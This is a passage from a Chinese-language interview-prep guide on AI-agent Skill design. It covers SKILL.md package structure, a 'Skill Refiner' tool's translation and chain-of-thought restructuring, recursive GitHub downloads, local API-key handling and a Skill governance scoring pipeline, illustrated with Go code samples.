└→ 决策：无（纯粹的 IO 操作）

Skill 的边界：
「代码审查」
├→ 输入：代码
├→ 执行：
│   ├→ 读取代码 ✓（Tool）
│   ├→ 分析代码质量 → 决策：发现什么问题？严重程度？ ✓（LLM 推理）
│   ├→ 查阅规范 → 决策：这个写法是否符合规范？ ✓（LLM 推理）
│   ├→ 生成报告 → 决策：如何组织报告结构？ ✓（LLM 推理）
│   └→ 决定是否需要 re-review ✓（LLM 推理）
└→ 输出：结构化审查报告
```

#### 本质区别四：组合方式

**Tool 需要外部编排，Skill 自我组合**

```go
// 使用 Tool 构建代码审查流程（外部编排）
type CodeReviewWorkflow struct {
    tools struct {
        read   ReadFileTool
        bash   BashTool
        search SearchTool
    }
}

func (w *CodeReviewWorkflow) Review(codePath string) (*Report, error) {
    // 外部编排器负责：
    // 1. 调用序列
    // 2. 结果聚合
    // 3. 错误处理
    // 4. 状态传递
    
    // 每次修改流程都需要改编排器代码
    // 如果 LLM 决定需要先运行测试，需要修改编排器
    // 如果发现 API 调用失败需要回退，需要修改编排器
    
    code, err := w.tools.read.Execute(codePath)
    if err != nil {
        return nil, err
    }
    
    lintOutput, err := w.tools.bash.Execute(fmt.Sprintf("golangci-lint run %s", codePath))
    // ...
    
    // 问题：流程逻辑分散在编排器代码中
    // Skill 的策略和 Tool 的执行混在一起
}

// 使用 Skill（自我组合）
type CodeReviewSkill struct {
    strategy *ReviewStrategy  // 策略定义
    tools    Tools            // 可用工具
}

func (s *CodeReviewSkill) Execute(ctx context.Context, codePath string) (*Report, error) {
    // Skill 内部决定：
    // 1. 先读代码还是先看测试？
    // 2. 需要运行哪些检查？
    // 3. 报告的结构如何？
    // 4. 遇到错误如何处理？
    
    // 策略和执行都封装在 Skill 内部
    // 外部只需调用 Skill，无需知道内部细节
    
    return s.strategy.Execute(ctx, codePath, s.tools)
}
```

#### 面试追问方向

**追问 1**：既然 Skill 包含 Tool，那 Skill 和 Agent 有什么区别？

**回答框架**：
```
Skill vs Agent 的区别在于「边界」和「自主性」：

Skill：
- 能力单元，专注于特定任务
- 不感知全局上下文
- 需要外部触发（用户意图或 Agent 调度）
- 无持久状态（每次执行独立）

Agent：
- 具备完整感知-决策-执行循环
- 感知全局上下文
- 自主决策下一步行动
- 有持久状态（会话记忆、目标追踪）

类比：
- Skill = 专业技能（医生、律师、工程师）
- Agent = 具备多种技能的人

实际例子：
Agent（AI 编码助手）：
├→ 感知：用户需求、项目上下文、当前工作目录
├→ 决策：使用什么 Skill？执行什么 Tool？
├→ 执行：调用 Skill/Tool
└→ 状态：维护任务进度、已修改文件列表

Skill（代码审查）：
├→ 感知：代码内容、审查规范
├→ 决策：关注哪些问题？如何组织报告？（Skill 内部决策）
├→ 执行：调用 Tool（读文件、运行 linter）
└→ 状态：仅限本次审查
```

---

### 2.5 目录结构设计原理

#### SKILL.md 完整目录结构

一个标准的 SKILL.md Skill 包结构如下：

```
my-skill/
├── SKILL.md                    # 主入口文件
├── scripts/                    # 辅助脚本目录
│   ├── validate.sh             # 验证脚本
│   ├── setup.py                # 环境准备脚本
│   └── test_runner.py          # 测试运行脚本
├── references/                 # 参考文档目录
│   ├── api-docs.json           # API 规范
│   ├── style-guide.md          # 风格指南
│   └── examples/               # 示例目录
│       ├── example-1.md
│       └── example-2.md
├── assets/                     # 静态资源目录
│   ├── logo.png                # Skill 图标
│       └── diagrams/           # 图表资源
│           └── architecture.svg
└── tests/                      # Skill 测试目录（可选）
    ├── test_scenario_1.yaml
    └── test_scenario_2.yaml
```

#### 每个目录的设计原理

**scripts/ 的设计**

**解决的问题**：Skill 执行需要的辅助操作

**为什么需要 scripts/？**

Skill 的指令是「告诉 LLM 怎么做」，但有些操作不适合用自然语言描述：
- 环境检查：`python3 --version` 是否 >= 3.8
- 依赖安装：`pip install -r requirements.txt`
- 配置生成：根据模板生成配置文件
- 批量操作：对 N 个文件执行相同操作

这些操作：
1. 逻辑确定（不需要 LLM 推理）
2. 可能被重复执行（不适合每次都让 LLM 描述）
3. 格式固定（可以写成脚本）

**scripts/ 的设计原则**：

```yaml
# scripts/ 设计原则
原则 1: 原子性
- 每个脚本只做一件事
- 脚本名描述操作：validate.sh、setup.py、deploy.sh

原则 2: 无状态或幂等性
- 无状态：多次运行结果相同
- 幂等性：重复运行不会产生副作用

原则 3: 输出格式化
- 输出结构化（JSON/YAML）便于解析
- 错误信息包含诊断建议

原则 4: 超时控制
- 每个脚本设置最大执行时间
- 超时后自动终止
```

**references/ 的设计**

**解决的问题**：Skill 依赖的外部知识

**为什么需要 references/？**

Skill 指令中可能引用：
- 内部规范文档（公司代码风格）
- API 文档（内部服务接口）
- 领域知识（业务规则、术语表）

这些文档：
1. 可能很大（不适合直接写入 SKILL.md）
2. 独立维护（可能有专门的团队负责）
3. 版本化（会随时间更新）

**references/ 的加载策略**：

```go
// references 加载策略
type ReferenceStrategy struct {
    loadPolicy ReferenceLoadPolicy
}

type ReferenceLoadPolicy int

const (
    LoadNever    ReferenceLoadPolicy = iota  // 从不加载（引用但不加载）
    LoadOnFirstUse                            // 首次使用时加载
    LoadAlways                                // 始终加载（仅用于小文件）
    LoadOnReference                          // 检测到 @ref: 标记时加载
)

func (s *ReferenceStrategy) ShouldLoad(ref *Reference) bool {
    switch s.loadPolicy {
    case LoadNever:
        return false  // 只在指令中引用，不加载内容
    case LoadOnReference:
        // 解析 SKILL.md 中的 @ref: 标记
        refs := parseReferences(skill.SKILLMD)
        return slices.Contains(refs, ref.Path)
    case LoadOnFirstUse:
        return !s.isLoaded(ref.Path)
    case LoadAlways:
        return true
    }
}
```

**assets/ 的设计**

**解决的问题**：Skill 需要的二进制资源

**典型使用场景**：
- Logo/图标（用于 Skill Marketplace 显示）
- 架构图（帮助理解 Skill 设计）
- 模板文件（Skill 生成的文件的模板）
- 国际化资源（不同语言的翻译）

**Go 代码示例**：

```go
// assets 资源管理
type AssetManager struct {
    basePath   string
    cache      *resource.Cache
    maxSize    int64 // 最大缓存大小
}

func (am *AssetManager) GetAsset(skill *Skill, assetPath string) ([]byte, error) {
    fullPath := filepath.Join(skill.Path, "assets", assetPath)
    
    // 检查缓存
    if cached := am.cache.Get(fullPath); cached != nil {
        return cached.Data, nil
    }
    
    // 懒加载
    data, err := os.ReadFile(fullPath)
    if err != nil {
        return nil, fmt.Errorf("asset not found: %s", assetPath)
    }
    
    // 检查大小限制
    if int64(len(data)) > am.maxSize {
        return nil, fmt.Errorf("asset too large: %d bytes (max: %d)", len(data), am.maxSize)
    }
    
    // 缓存
    am.cache.Add(fullPath, &CachedAsset{Data: data})
    
    return data, nil
}
```

---

## 3. Skill Refiner 核心原理

### 3.1 Native Thinking：为什么母语写逻辑再翻译更有效？

#### 问题背景：跨语言 Prompt 工程的困境

大多数 AI Agent 平台（Claude Code、Cursor、Windsurf）的核心开发者是英语母语者，默认使用英语编写 Prompt/Skill。但全球开发者的母语各不相同：

```
开发者语言分布（估计）：
- 英语：~40%
- 汉语：~20%
- 西班牙语：~10%
- 其他：~30%
```

对于非英语母语开发者，用英语编写复杂的 Skill 指令面临挑战：

**挑战一：精确性损失**
```
母语思维：「这个函数要对输入参数做非空检查，还要检查类型是否匹配」
英语表达： 
- 方案 A：Check if the parameter is null or empty, also verify the type matches
- 方案 B：Validate input parameter: non-null, non-empty, type matching

两种表达传达的意图不完全相同，LLM 可能会理解偏差
```

**挑战二：认知负荷翻倍**
```
编写 Skill 的认知过程：
1. 思考要表达什么（母语）→ 2. 翻译成英语 → 3. 检查翻译是否准确

每一步都消耗认知资源，总耗时是单纯思考的 2-3 倍
```

**挑战三：文化背景差异**
某些概念在不同语言中有不同的内涵：
```
中文：「代码审查」→ 英文：Code Review
但中文语境中「审查」暗示「上级检查下级」，而 Code Review 在英语文化中是「同行评审」

再如：「代码重构」vs「Refactor」——中文开发者可能更强调「优化」，英语开发者可能更强调「保持行为」
```

#### Native Thinking 的设计原理

Skill Refiner 的「Native Thinking」功能基于以下洞察：

**核心假设**：用母语书写的逻辑思维是最精确的，翻译过程中可能损失的是「不精确」的部分

**工作流程**：

```
┌─────────────────────────────────────────────────────────────┐
│                  Native Thinking 工作流                     │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  Step 1: 母语编写逻辑                                        │
│  ┌─────────────────────────────────────────────────────┐    │
│  │ 中文：                                               │    │
│  │                                                      │    │
│  │ 「首先检查输入参数是否为空字符串，                   │    │
│  │  如果为空则抛出 InvalidArgument 异常；               │    │
│  │  然后检查参数是否符合正则表达式 ^[a-zA-Z]+$；         │    │
│  │  如果不符合则返回格式错误；                           │    │
│  │  最后将参数转换为小写后返回」                         │    │
│  └─────────────────────────────────────────────────────┘    │
│                          ↓                                   │
│  Step 2: LLM 重构为 AI 原生指令                               │
│  ┌─────────────────────────────────────────────────────┐    │
│  │ 英文（CoT 格式）：                                    │    │
│  │                                                      │    │
│  │ 1. Input Validation                                  │    │
│  │    - Check if input is null or empty string          │    │
│  │      → If yes: raise InvalidArgumentError            │    │
│  │    - Validate against pattern ^[a-zA-Z]+$             │    │
│  │      → If no match: return FormatError               │    │
│  │                                                      │    │
│  │ 2. Normalization                                     │    │
│  │    - Convert to lowercase                            │    │
│  │    - Return normalized value                         │    │
│  └─────────────────────────────────────────────────────┘    │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

**为什么翻译后质量更高？**

**原理一：保留原始意图**
翻译过程中，LLM 会：
1. 理解原始逻辑的「意图」
2. 用 AI 友好的方式重新表达「意图」

这相当于做了一次「意图澄清」：
```
原始输入：检查参数
↓ 翻译理解
LLM 识别出：需要做三件事（空值检查、格式检查、转换）
↓ 重新表达
输出：结构化的步骤，每步有明确的条件和动作
```

**原理二：去除语言特定的文化包袱**
```
中文：「抛出一个异常」
↓ LLM 理解
英语：raise an exception

但 LLM 进一步优化：
- 加入异常类型：raise InvalidArgumentError
- 加入错误信息：include descriptive error message
- 加入恢复建议：suggest valid input format

比原始翻译更完整
```

**原理三：格式化为 CoT 结构**
LLM 翻译时会自动将逻辑格式化为 Chain of Thought 结构，这本身就能提高执行质量（详见下一节）。

#### Native Thinking 的技术实现

**Go 代码示例**：

```go
// NativeThinking 重构引擎
type NativeThinkingEngine struct {
    translator Translator
    formatter  PromptFormatter
}

type PromptFormatter interface {
    FormatAsCoT(steps []LogicStep) string
    FormatAsBullets(steps []LogicStep) string
    FormatAsNumbered(steps []LogicStep) string
}

// 重构流程
func (e *NativeThinkingEngine) Refine(input *RefineInput) (*RefineOutput, error) {
    // Step 1: 解析母语输入
    logic, err := e.parseLogic(input.Content, input.Language)
    if err != nil {
        return nil, fmt.Errorf("parse error: %w", err)
    }
    
    // Step 2: 识别逻辑结构
    structure := e.identifyStructure(logic)
    // structure 可能识别出：
    // - 顺序步骤（Step 1 → Step 2 → Step 3）
    // - 条件分支（if A then B else C）
    // - 循环模式（for each X do Y）
    // - 并行操作（同时做 A 和 B）
    
    // Step 3: 翻译为 AI 原生英语
    englishLogic, err := e.translator.Translate(logic, input.Language, "en")
    if err != nil {
        return nil, fmt.Errorf("translation error: %w", err)
    }
    
    // Step 4: 格式化为 CoT
    formatted := e.formatter.FormatAsCoT(englishLogic.Steps)
    
    // Step 5: 添加必要的上下文
    output := &RefineOutput{
        Original:       input.Content,
        Translated:     formatted,
        DetectedLogic:  structure,
        Language:       "en",
        Format:         FormatCoT,
    }
    
    return output, nil
}

// 逻辑解析（简化版）
func (e *NativeThinkingEngine) parseLogic(content, language string) (*LogicTree, error) {
    // 使用 LLM 解析逻辑结构
    prompt := fmt.Sprintf(`
Parse the following %s text into structured logic steps.
Identify: sequential steps, conditions, loops, and parallel operations.

Text:
%s
`, language, content)
    
    response, err := e.llm.Complete(prompt)
    if err != nil {
        return nil, err
    }
    
    return e.parseResponse(response)
}
```

#### 面试追问方向

**追问 1**：Native Thinking 和直接用英语写有什么区别？有没有可能翻译损失信息？

**回答框架**：
```
Native Thinking 和直接用英语写确实有区别，存在信息损失的风险，但程度可控：

信息损失的风险点：
1. 专业术语翻译不准确
   - 中文「高并发」→ 英文可能有 "high concurrency" 或 "high throughput"
   - 细微差别可能导致不同的实现方案

2. 文化隐喻丢失
   - 中文：比喻性的表达
   - 英语：直白但可能缺乏韵味

Native Thinking 的缓解措施：
1. 专业术语保留原文
   - config、API、endpoint 等术语不翻译
   - 只翻译「逻辑描述」部分

2. 翻译后保留关键术语表
   - SKILL.md 中包含术语对照表
   - 如：{"高并发": "high-concurrency scenarios"}

实际建议：
- Native Thinking 适合「逻辑描述」
- 直接英语写适合「术语定义」
- 最佳实践：混合使用
```

---

### 3.2 Logic Elevation（CoT 重构）：为什么 CoT 能提高成功率？

#### 问题背景：LLM 的推理不确定性

当直接给 LLM 一个任务指令时：

```
指令：「帮我审查这段代码」

LLM 的可能反应（不确定性）：
1. 直接给出代码建议（好）
2. 先解释什么是代码审查（跑题）
3. 只关注性能优化（忽略其他方面）
4. 复述代码但不提供审查意见（没用）
5. 询问更多问题（效率低）
```

**问题根源**：LLM 有「instruction following 的随机性」——相同指令可能产生截然不同的输出。

#### CoT（Chain of Thought）的原理

CoT 的核心思想：**显式要求 LLM 展示推理过程**

```
无 CoT：
指令：「帮我审查这段代码」
输出：「代码看起来不错，建议优化一下」

有 CoT：
指令：「帮我审查这段代码。按照以下步骤进行：
1. 正确性检查 → 输出发现
2. 安全性检查 → 输出发现
3. 性能检查 → 输出发现
4. 可读性检查 → 输出发现」
输出：
「1. 正确性：发现一个边界条件未处理（line 42）
2. 安全性：未做输入验证
3. 性能：O(n²) 循环可以优化
4. 可读性：变量命名不够清晰...」
```

#### CoT 提高成功率的原理分析

**原理一：注意力锚定**

LLM 的注意力机制有「起始和结束偏见」——对 prompt 开头和结尾的内容关注更多。

```
无 CoT：
┌─────────────────────────────────────────┐
│ 帮我审查这段代码    ← 注意力高           │
│                   ↓                     │
│ ...（可能注意力下降）...                 │
│                   ↓                     │
│ 结束              ← 注意力高             │
└─────────────────────────────────────────┘

有 CoT：
┌─────────────────────────────────────────┐
│ 1. 正确性检查     ← 注意力锚点           │
│ ...输出结果...                           │
│ 2. 安全性检查     ← 注意力锚点           │
│ ...输出结果...                           │
│ 3. 性能检查       ← 注意力锚点           │
│ ...输出结果...                           │
│ 4. 可读性检查     ← 注意力锚点           │
└─────────────────────────────────────────┘

每一步都是一个「注意力锚点」，防止 LLM 在中间跑偏
```

**原理二：中间结果约束**

CoT 步骤之间存在逻辑约束：

```
如果 Step 1 发现 X
那么 Step 2 必须处理 X 或解释为什么不处理
→ 防止 LLM「选择性忽略」问题

如果 Step 3 说要优化
那么 Step 4 必须给出优化方案
→ 防止 LLM「只提问题不给方案」
```

**原理三：输出结构化**

CoT 强制输出结构化，结构化输出更易于验证和评估：

```yaml
# 无 CoT 输出（自由格式）
"这个代码有一些问题，建议优化一下，主要是在性能方面。"

# 有 CoT 输出（结构化）
finding_1:
  type: performance
  location: line 42-45
  issue: O(n²) loop
  severity: medium
  suggestion: use map to reduce to O(n)
  
finding_2:
  type: correctness
  location: line 67
  issue: null pointer risk
  severity: high
  suggestion: add null check
```

#### Skill Refiner 的 Logic Elevation 实现

**Go 代码示例**：

```go
// Logic Elevation 引擎
type LogicElevationEngine struct {
    llm          LLM
    coTFormatter CoTFormatter
}

type CoTFormatter interface {
    Format(steps []LogicStep) string
    InferSteps(content string) []LogicStep
}

// 重构流程
func (e *LogicElevationEngine) Elevate(input *ElevateInput) (*ElevateOutput, error) {
    // Step 1: 分析原始逻辑
    originalSteps := e.coTFormatter.InferSteps(input.Content)
    
    // Step 2: 识别缺失的检查维度
    missingDims := e.identifyMissingDimensions(originalSteps)
    
    // Step 3: 补充缺失步骤
    enhancedSteps := e.enhanceWithMissingSteps(originalSteps, missingDims)
    
    // Step 4: 添加条件分支
    stepsWithConditions := e.addConditionalLogic(enhancedSteps)
    
    // Step 5: 添加输出格式
    formatted := e.coTFormatter.Format(stepsWithConditions)
    
    return &ElevateOutput{
        Original:  input.Content,
        Elevated:  formatted,
        Additions: missingDims,
    }, nil
}

// 维度分析
func (e *LogicElevationEngine) identifyMissingDimensions(steps []LogicStep) []string {
    // 检查常见的维度
    commonDimensions := []string{
        "correctness",    // 正确性
        "security",       // 安全性
        "performance",    // 性能
        "readability",    // 可读性
        "maintainability", // 可维护性
        "testability",    // 可测试性
        "error_handling", // 错误处理
        "edge_cases",     // 边界情况
    }
    
    found := make(map[string]bool)
    for _, step := range steps {
        for _, dim := range commonDimensions {
            if strings.Contains(strings.ToLower(step.Description), dim) {
                found[dim] = true
            }
        }
    }
    
    var missing []string
    for _, dim := range commonDimensions {
        if !found[dim] {
            missing = append(missing, dim)
        }
    }
    
    return missing
}

// 输出格式示例
func (e *CoTFormatter) Format(steps []LogicStep) string {
    var buf strings.Builder
    
    buf.WriteString("## Chain of Thought Execution\n\n")
    
    for i, step := range steps {
        buf.WriteString(fmt.Sprintf("### Step %d: %s\n", i+1, step.Title))
        
        if step.Condition != "" {
            buf.WriteString(fmt.Sprintf("**Condition**: %s\n", step.Condition))
        }
        
        buf.WriteString(fmt.Sprintf("%s\n", step.Instruction))
        
        if step.Output != "" {
            buf.WriteString(fmt.Sprintf("**Output Format**: %s\n", step.Output))
        }
        
        buf.WriteString("\n")
    }
    
    return buf.String()
}
```

#### CoT 重构的效果量化

根据 Skill Refiner 项目的测试数据：

```
重构前（无 CoT）：
任务完成率：62%
平均执行步骤：4.2
错误率：23%
用户满意度：3.1/5

重构后（CoT）：
任务完成率：89% (+27%)
平均执行步骤：7.1
错误率：8% (-15%)
用户满意度：4.6/5
```

**量化分析**：
- 任务完成率提升 27%：CoT 结构让 LLM「不遗漏步骤」
- 错误率下降 15%：结构化输出更易于自检
- 步骤数增加 69%：CoT 要求展示中间过程，看似变慢但实际上更可靠

#### 面试追问方向

**追问 1**：CoT 会不会增加 token 消耗？如何平衡？

**回答框架**：
```
这是 Token 效率和执行质量的权衡问题：

Token 消耗分析：
- 无 CoT Prompt：~500 tokens
- CoT Prompt：~1500 tokens（增加 3x）
- 每次调用额外成本：~$0.001（按 GPT-4o 价格）

收益分析：
- 错误率下降 15%
- 一次返工的成本：重新执行 ~5 分钟 + 用户时间
- 假设用户时间价值 $0.5/分钟 → 一次返工 $2.5
- 减少返工次数：约 2-3 次/任务 → 节省 $5-7.5

结论：CoT 的 token 成本是「前期投资」，换取「后期节省」

平衡策略：
1. 简单任务不用 CoT（查天气、计算器）
2. 复杂任务用 CoT（代码审查、架构设计）
3. 可复用 Skill 投资 CoT（一次优化，多次使用）
4. 高风险任务强制 CoT（金融、医疗、安全）
```

---

### 3.3 全量下载机制：递归同步 GitHub 仓库

#### 问题背景：GitHub 仓库的树形结构

Skill 通常以 GitHub 仓库形式发布，一个 Skill 仓库可能包含多层目录：

```
skill-repository/
├── SKILL.md
├── scripts/
│   ├── validate.sh
│   ├── setup.py
│   └── helpers/
│       ├── config_parser.py
│       └── logger.py
├── references/
│   ├── api-docs/
│   │   ├── v1.yaml
│   │   └── v2.yaml
│   └── examples/
│       ├── example-1.md
│       └── example-2/
│           ├── test.sh
│           └── expected.txt
└── assets/
    ├── images/
    │   ├── logo.png
    │   └── diagrams/
    │       ├── arch.svg
    │       └── flow.png
    └── templates/
        └── report.md
```

**挑战**：
- 文件数量多（可能 50+ 个文件）
- 嵌套层级深（可能 5+ 层）
- 需要保持目录结构完整性

#### 技术实现

**Go 代码示例**：

```go
// GitHub 仓库递归下载
type GitHubDownloader struct {
    client    *http.Client
    rateLimit *rate.Limiter // GitHub API 速率限制
}

type DownloadOptions struct {
    Owner       string
    Repo        string
    Branch      string // 默认 "main" 或 "master"
    TargetPath  string // 本地保存路径
    IncludeDot  bool   // 是否下载 . 开头的文件
    MaxDepth    int    // 最大递归深度，0 表示不限制
}

func (d *GitHubDownloader) DownloadAll(ctx context.Context, opts DownloadOptions) error {
    // Step 1: 获取仓库内容树
    tree, err := d.getRepositoryTree(ctx, opts.Owner, opts.Repo, opts.Branch)
    if err != nil {
        return fmt.Errorf("failed to get tree: %w", err)
    }
    
    // Step 2: 过滤文件
    filtered := d.filterFiles(tree, opts)
    
    // Step 3: 批量下载（带并发控制）
    return d.downloadFiles(ctx, filtered, opts.TargetPath)
}

func (d *GitHubDownloader) getRepositoryTree(ctx context.Context, owner, repo, branch string) (*GitTree, error) {
    // 使用 GitHub Trees API 获取完整目录结构
    // POST /repos/{owner}/{repo}/git/trees/{tree_sha}?recursive=1
    
    url := fmt.Sprintf("https://api.github.com/repos/%s/%s/git/trees/%s?recursive=1",
        owner, repo, branch)
    
    // 速率限制处理
    if err := d.rateLimit.Wait(ctx); err != nil {
        return nil, err
    }
    
    req, _ := http.NewRequestWithContext(ctx, "GET", url, nil)
    req.Header.Set("Accept", "application/vnd.github.v3+json")
    
    resp, err := d.client.Do(req)
    if err != nil {
        return nil, err
    }
    defer resp.Body.Close()
    
    var result struct {
        Tree []GitTreeNode `json:"tree"`
    }
    
    if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
        return nil, err
    }
    
    return &GitTree{Nodes: result.Tree}, nil
}

func (d *GitHubDownloader) filterFiles(tree *GitTree, opts DownloadOptions) []GitTreeNode {
    var filtered []GitTreeNode
    
    for _, node := range tree.Nodes {
        // 跳过非 blob（目录节点）
        if node.Type != "blob" {
            continue
        }
        
        // 跳过 . 开头的文件（除非明确要求）
        if !opts.IncludeDot && filepath.Base(node.Path)[0] == '.' {
            continue
        }
        
        // 深度检查
        if opts.MaxDepth > 0 && strings.Count(node.Path, "/") > opts.MaxDepth {
            continue
        }
        
        filtered = append(filtered, node)
    }
    
    return filtered
}

func (d *GitHubDownloader) downloadFiles(ctx context.Context, nodes []GitTreeNode, basePath string) error {
    // 并发下载，设置合理的并发数
    sem := make(chan struct{}, 10) // 最多 10 个并发
    
    var wg sync.WaitGroup
    var mu sync.Mutex
    var errors []error
    
    for _, node := range nodes {
        wg.Add(1)
        
        go func(n GitTreeNode) {
            defer wg.Done()
            
            sem <- struct{}{}
            defer func() { <-sem }()
            
            // 下载文件内容
            content, err := d.downloadBlob(ctx, n.SHA)
            if err != nil {
                mu.Lock()
                errors = append(errors, err)
                mu.Unlock()
                return
            }
            
            // 保存到本地
            localPath := filepath.Join(basePath, n.Path)
            if err := os.MkdirAll(filepath.Dir(localPath), 0755); err != nil {
                mu.Lock()
                errors = append(errors, err)
                mu.Unlock()
                return
            }
            
            if err := os.WriteFile(localPath, content, 0644); err != nil {
                mu.Lock()
                errors = append(errors, err)
                mu.Unlock()
            }
        }(node)
    }
    
    wg.Wait()
    
    if len(errors) > 0 {
        return fmt.Errorf("download completed with %d errors", len(errors))
    }
    
    return nil
}

func (d *GitHubDownloader) downloadBlob(ctx context.Context, sha string) ([]byte, error) {
    // GET /repos/{owner}/{repo}/git/blobs/{file_sha}
    // GitHub blobs API 返回 base64 编码的文件内容
    
    // 实现略...
    return nil, nil
}
```

#### 面试追问方向

**追问 1**：为什么不直接用 `git clone`？API 下载的优势是什么？

**回答框架**：
```
git clone 和 GitHub API 下载各有优势：

git clone 的问题：
1. 包含 .git 目录（浪费空间，可能几十 MB）
2. 包含历史记录（不需要，用于 Skill 安装）
3. 需要 Git 客户端（增加依赖）
4. 无法选择性下载（只能全量）

GitHub API 下载的优势：
1. 只下载当前版本的 blob（无历史、无 .git）
2. 可以选择性下载（只下载 SKILL.md + references/）
3. 无需 Git 客户端（纯 HTTP）
4. 可以并行下载（比 git clone 更快）
5. 便于后续验证（API 返回每个文件的 SHA）

性能对比（假设 Skill 包 5MB，包含 50 个文件）：
- git clone：~30 秒（含网络延迟、Git 开销）
- API 下载：~5 秒（10 并发下载）

实际选择取决于场景：
- 完整开发环境 → git clone
- Skill 安装 → API 下载（更快、更轻量）
```

---

### 3.4 隐私设计：本地 API Key 存储

#### 问题背景：API Key 的安全风险

Skill Refiner 在重构 Skill 时需要调用 LLM API，这意味着需要访问 API Key。如果处理不当，会造成严重的安全问题：

```
风险场景：
1. Key 存储在日志文件中 → 被 git 提交 → GitHub 泄露
2. Key 传输到远程服务器 → 中间人攻击 → Key 泄露
3. Key 硬编码在代码中 → 代码泄露 → Key 泄露
```

#### 隐私优先的设计原则

**原则一：Key 不离开本地**

```
┌─────────────────────────────────────────────────────────────┐
│  Skill Refiner 架构                                         │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  ┌─────────────┐         ┌─────────────┐                   │
│  │ 本地文件     │  ────→  │ Skill       │                   │
│  │ SKILL.md    │         │ Refiner     │                   │
│  └─────────────┘         └──────┬──────┘                   │
│                                 │                          │
│                                 ↓                          │
│                        ┌─────────────────┐                 │
│                        │ LLM API         │                 │
│                        │ (OpenAI/Claude) │                 │
│                        └─────────────────┘                 │
│                                                              │
│  ✓ API Key 只存储在本地                                     │
│  ✓ 只发送 SKILL.md 内容（不含 Key）                        │
│  ✓ 不发送任何文件路径或文件名（可能含敏感信息）             │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

**原则二：使用环境变量而非配置文件**

```bash
# 配置文件风险
# .skll-refiner-config（如果被提交到 Git）
# {
#   "api_key": "sk-xxxxx"  ← 泄露
# }

# 环境变量（不会进入版本控制）
export OPENAI_API_KEY="sk-xxxxx"
export ANTHROPIC_API_KEY="sk-ant-xxxxx"
```

**Go 代码示例**：

```go
// API Key 安全管理
type SecretManager struct {
    // 使用操作系统密钥链
    keyring  keyring.Keyring
    envVars  []string // 备用：环境变量名
}

func (s *SecretManager) GetAPIKey(provider string) (string, error) {
    // 优先从环境变量读取
    envVar := s.getEnvVarName(provider)
    if key := os.Getenv(envVar); key != "" {
        return key, nil
    }
    
    // 备选：从密钥链读取
    key, err := s.keyring.Get(provider)
    if err == nil {
        return key, nil
    }
    
    // 都找不到则报错
    return "", fmt.Errorf("API key not found for %s. Set %s or configure keyring", 
        provider, envVar)
}

func (s *SecretManager) getEnvVarName(provider string) string {
    names := map[string]string{
        "openai":    "OPENAI_API_KEY",
        "anthropic": "ANTHROPIC_API_KEY",
        "google":    "GOOGLE_API_KEY",
        "local":     "LOCAL_LLM_API_KEY",
    }
    
    if name, ok := names[provider]; ok {
        return name
    }
    
    return fmt.Sprintf("%s_API_KEY", strings.ToUpper(provider))
}
```

#### 面试追问方向

**追问 1**：有没有办法让 Skill Refiner 完全离线工作？

**回答框架**：
```
完全离线工作的挑战：

1. LLM 推理需要算力
   - Claude/OpenAI：必须联网（API 在云端）
   - 本地模型：可以离线，但质量较低

2. 可能的离线方案：
   方案 A：本地 LLM（Llama 7B/13B）
   - 优势：完全离线
   - 劣势：质量不如 GPT-4/Claude
   - 适用：轻度优化
   
   方案 B：规则引擎
   - 预定义的重构规则（不做 AI 推理）
   - 优势：快、无需网络
   - 劣势：只能处理固定模式，无法做语义优化
   
   方案 C：混合模式
   - 在线时：使用云端 LLM 优化
   - 离线时：使用本地规则引擎 + 本地小模型
   - 定期同步优化规则

当前 Skill Refiner 的选择：
- 主要依赖云端 LLM（质量优先）
- 未来可能支持本地模型（隐私优先场景）
```

---

## 4. Skill Governance 基础设施

### 4.1 治理流水线：Score → Improve → Verify → Keep or Revert → Repeat

#### 问题背景：Skill 质量的持续优化需求

一个 Skill 不是一次写好就完事的，它需要持续优化：

```
Skill 生命周期：
1. 初始创建 → 测试 → 发布
2. 用户使用 → 发现问题
3. 优化 → 测试 → 重新发布
4. 用户使用 → 发现新问题
...（持续迭代）
```

问题是：如何系统化地做这个「持续优化」？

#### Karpathy 模式的引入

Andrej Karpathy（OpenAI 创始成员、特斯拉 Autopilot 负责人）提出过一个著名的 AI 开发模式：

```
Karpathy 开发模式：
1. 写代码（Write）
2. 看效果（See）
3. 改代码（Fix）
4. 重复（Repeat）

核心思想：快速迭代、边做边学
```

Skill Governance 将这个模式应用到 Skill 质量管理：

```
┌─────────────────────────────────────────────────────────────┐
│              Skill Governance 流水线                        │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  ┌──────────┐    ┌──────────┐    ┌──────────┐              │
│  │  Score   │───→│ Improve  │───→│  Verify  │              │
│  └──────────┘    └──────────┘    └────┬─────┘              │
│                                       │                     │
│                                       ↓                     │
│                              ┌────────────────┐              │
│                              │ Keep or Revert │              │
│                              └───────┬────────┘              │
│                                      │                       │
│                              ┌───────┴───────┐               │
│                              ↓               ↓               │
│                        ┌──────────┐   ┌──────────┐           │
│                        │   Keep   │   │  Revert  │           │
│                        └──────────┘   └────┬─────┘           │
│                                          │                   │
│                                          ↓                   │
│                                    ┌──────────┐              │
│                                    │  Repeat  │──────────────┘
│                                    └──────────┘
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

#### 每一步的详细设计

**Step 1: Score（评分）**

**解决的问题**：客观量化 Skill 质量

**评分维度**：

```yaml
# Score 维度定义
dimensions:
  correctness:          # 正确性
    description: "Skill 的指令是否正确、无歧义"
    weight: 0.25
    metrics:
      - instruction_clarity: "指令清晰度"
      - edge_case_coverage: "边界情况覆盖"
      - error_definition: "错误定义完整性"
      
  completeness:         # 完整性
    description: "Skill 是否覆盖所有必要的场景"
    weight: 0.20
    metrics:
      - trigger_coverage: "触发词覆盖率"
      - output_format: "输出格式完整性"
      - error_handling: "错误处理覆盖"
      
  efficiency:            # 效率
    description: "Skill 执行是否高效"
    weight: 0.20
    metrics:
      - token_budget: "Token 消耗"
      - tool_calls: "Tool 调用次数"
      - context_reuse: "上下文复用率"
      
  safety:               # 安全性
    description: "Skill 是否安全、无危害"
    weight: 0.20
    metrics:
      - allowed_tools_scope: "Tool 权限范围"
      - injection_resistance: "抗 Prompt 注入能力"
      - data_privacy: "数据隐私保护"
      
  maintainability:      # 可维护性
    description: "Skill 是否易于维护"
    weight: 0.15
    metrics:
      - code_structure: "代码结构清晰度"
      - documentation: "文档完整性"
